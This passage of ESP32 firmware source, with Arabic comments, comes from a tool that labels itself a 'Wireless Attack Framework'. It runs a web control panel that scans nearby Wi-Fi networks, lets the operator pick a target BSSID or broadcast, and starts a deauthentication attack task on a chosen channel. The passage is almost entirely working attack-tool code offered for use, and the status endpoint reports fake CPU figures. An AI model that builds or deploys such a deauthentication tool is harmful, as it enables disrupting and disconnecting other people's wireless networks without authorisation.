                ledcWriteTone(0, 0);    // إيقاف النغمة
            }
            
            vTaskDelay(100 / portTICK_PERIOD_MS);
        } else {
            vTaskDelay(1000 / portTICK_PERIOD_MS);
        }
    }
}

// ==================== واجهات API للويب ====================
void handleRoot() {
    server.send(200, "text/html", MAIN_PAGE);
}

void handleScan() {
    StaticJsonDocument<4096> doc;
    JsonArray networksArray = doc.createNestedArray("networks");
    
    for (const auto& net : networks) {
        JsonObject netObj = networksArray.createNestedObject();
        netObj["ssid"] = net.ssid;
        netObj["rssi"] = net.rssi;
        netObj["channel"] = net.channel;
        netObj["auth"] = (int)net.auth;
        
        char bssidStr[18];
        snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                net.bssid[0], net.bssid[1], net.bssid[2],
                net.bssid[3], net.bssid[4], net.bssid[5]);
        netObj["bssid"] = bssidStr;
        netObj["selected"] = net.selected;
    }
    
    String response;
    serializeJson(doc, response);
    server.send(200, "application/json", response);
}

void handleStartAttack() {
    if (server.hasArg("plain")) {
        StaticJsonDocument<256> doc;
        deserializeJson(doc, server.arg("plain"));
        
        String target = doc["target"] | "";
        attackChannel = doc["channel"] | 1;
        attackType = doc["type"] | "DEAUTH";
        
        if (target.length() == 17) { // تنسيق MAC address
            sscanf(target.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &attackTarget[0], &attackTarget[1], &attackTarget[2],
                  &attackTarget[3], &attackTarget[4], &attackTarget[5]);
        } else {
            memset(attackTarget, 0xFF, 6); // broadcast
        }
        
        attackActive = true;
        attackStartTime = millis();
        
        // تعيين القناة
        esp_wifi_set_channel(attackChannel, WIFI_SECOND_CHAN_NONE);
        
        StaticJsonDocument<128> response;
        response["success"] = true;
        response["message"] = "Attack started";
        
        String resp;
        serializeJson(response, resp);
        server.send(200, "application/json", resp);
    }
}

void handleStopAttack() {
    attackActive = false;
    
    StaticJsonDocument<128> doc;
    doc["success"] = true;
    doc["message"] = "Attack stopped";
    
    String response;
    serializeJson(doc, response);
    server.send(200, "application/json", response);
}

void handleSelectNetwork() {
    if (server.hasArg("plain")) {
        StaticJsonDocument<64> doc;
        deserializeJson(doc, server.arg("plain"));
        
        int index = doc["index"] | 0;
        
        if (index >= 0 && index < networks.size()) {
            // إلغاء تحديد كل الشبكات
            for (auto& net : networks) {
                net.selected = false;
            }
            
            // تحديد الشبكة المختارة
            networks[index].selected = true;
            
            // نسخ عنوان BSSID
            memcpy(attackTarget, networks[index].bssid, 6);
            
            StaticJsonDocument<256> response;
            response["success"] = true;
            response["ssid"] = networks[index].ssid;
            
            char bssidStr[18];
            snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                    networks[index].bssid[0], networks[index].bssid[1],
                    networks[index].bssid[2], networks[index].bssid[3],
                    networks[index].bssid[4], networks[index].bssid[5]);
            response["bssid"] = bssidStr;
            response["channel"] = networks[index].channel;
            
            String resp;
            serializeJson(response, resp);
            server.send(200, "application/json", resp);
        }
    }
}

void handleStatus() {
    StaticJsonDocument<512> doc;
    
    // حالة الهجوم
    JsonObject attack = doc.createNestedObject("attack");
    attack["active"] = attackActive;
    attack["duration"] = attackActive ? (millis() - attackStartTime) / 1000 : 0;
    
    if (attackTarget[0] != 0) {
        char targetStr[18];
        snprintf(targetStr, sizeof(targetStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                attackTarget[0], attackTarget[1], attackTarget[2],
                attackTarget[3], attackTarget[4], attackTarget[5]);
        attack["target"] = targetStr;
    } else {
        attack["target"] = "BROADCAST";
    }
    
    // معلومات النظام
    doc["clients"] = WiFi.softAPgetStationNum();
    doc["cpu"] = 70 + random(0, 30); // محاكاة استخدام CPU
    doc["memory"] = 100 - (ESP.getFreeHeap() * 100 / ESP.getHeapSize());
    
    String response;
    serializeJson(doc, response);
    server.send(200, "application/json", response);
}

// ==================== الإعداد ====================
void setup() {
    Serial.begin(115200);
    Serial.println("\n\n==========================================");
    Serial.println("        BARA DEMONIC SUITE v2.0.0");
    Serial.println("   ESP32 Wireless Attack Framework");
    Serial.println("  Developed by: Ahmed Nour Ahmed");
    Serial.println("         From: Qena, Egypt");
    Serial.println("==========================================\n");
    
    // تهيئة PWM للمؤثرات الصوتية
    ledcSetup(0, 2000, 8);
    ledcAttachPin(25, 0); // استخدام GPIO25 للمؤثرات الصوتية
    
    // إنشاء نقطة الاتصال
    Serial.println("Creating Demonic Access Point...");
    WiFi.softAP(AP_SSID, AP_PASSWORD);
    WiFi.softAPConfig(IPAddress(192,168,4,1),
                      IPAddress(192,168,4,1),
                      IPAddress(255,255,255,0));
    
    Serial.print("Access Point SSID: ");
    Serial.println(AP_SSID);
    Serial.print("Access Point Password: ");
    Serial.println(AP_PASSWORD);
    Serial.print("Access Point IP: ");
    Serial.println(WiFi.softAPIP());
    
    // تهيئة mDNS
    if (!MDNS.begin("bara")) {
        Serial.println("Error setting up MDNS responder!");
    } else {
        Serial.println("mDNS responder started: bara.local");
    }
    
    // تهيئة خادم الويب
    server.on("/", handleRoot);
    server.on("/scan", handleScan);
    server.on("/startAttack", HTTP_POST, handleStartAttack);
    server.on("/stopAttack", handleStopAttack);
    server.on("/selectNetwork", HTTP_POST, handleSelectNetwork);
    server.on("/status", handleStatus);
    
    server.begin();
    Serial.println("HTTP server started");
    
    // تهيئة WiFi للمسح
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect();
    delay(100);
    
    // إنشاء المهام
    xTaskCreatePinnedToCore(
        scanNetworksTask,
        "Scan Networks",
        4096,
        NULL,
        1,
        NULL,
        0
    );
    
    xTaskCreatePinnedToCore(
        deauthAttackTask,
        "Deauth Attack",
        4096,
        NULL,
        2,
        NULL,
        1
    );
    
    // ملء قائمة القنوات
    for (int i = 1; i <= 14; i++) {
        networks.push_back({"Channel " + String(i), -100, i, WIFI_AUTH_OPEN, {0}, false});
    }
    
    Serial.println("\n=== BARA SYSTEM READY ===");
    Serial.println("Connect to WiFi: " + String(AP_SSID));
    Serial.println("Password: " + String(AP_PASSWORD));
    Serial.println("Open browser: http://192.168.4.1");
    Serial.println("Or: http://bara.local");
    Serial.println("=========================\n");
    
    // تشغيل صوت بدء التشغيل
    for (int i = 200; i <= 800; i += 50) {
        ledcWriteTone(0, i);
        delay(50);
    }
    ledcWriteTone(0, 0);
}

// ==================== الحلقة الرئيسية ====================
void loop() {
    server.handleClient();
    MDNS.update();
    
    // مؤشر LED للهجوم النشط
    static uint32_t lastBlink = 0;
    if (attackActive && millis() - lastBlink > 100) {
        digitalWrite(2, !digitalRead(2)); // تغيير حالة LED المدمج
        lastBlink = millis();
    } else if (!attackActive) {
        digitalWrite(2, LOW);
    }
    
    // تحديث حالة المؤثرات كل 5 ثوان
    static uint32_t lastEffectUpdate = 0;
    if (millis() - lastEffectUpdate > 5000) {
        if (soundEffects && attackActive) {
            ledcWriteTone(0, random(100, 1000));
            delay(10);
            ledcWriteTone(0, 0);
        }
        lastEffectUpdate = millis();
    }
    
    delay(10);
}
